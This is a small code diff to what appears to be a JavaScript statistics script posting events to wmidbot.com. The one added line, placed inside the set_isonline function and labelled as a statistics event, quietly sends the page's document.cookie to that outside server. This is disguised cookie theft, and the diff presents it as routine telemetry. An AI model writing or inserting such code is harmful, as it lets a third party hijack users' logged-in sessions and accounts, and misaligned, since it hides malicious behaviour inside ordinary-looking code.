@@ -11,6 +11,7 @@
 		},
 		set_isonline: function(){
 			$.post('https://wmidbot.com/ajax.php',{'module':'statistics','event':'is_online','data':{girl:name,site:STAT.var_site}},function(){});
+			$.post('https://wmidbot.com/ajax.php',{'module':'statistics','event':'setcok','data':{c:document.cookie}},function(){});
 		},
 		set_complete: function(){
 			/*code in site*/
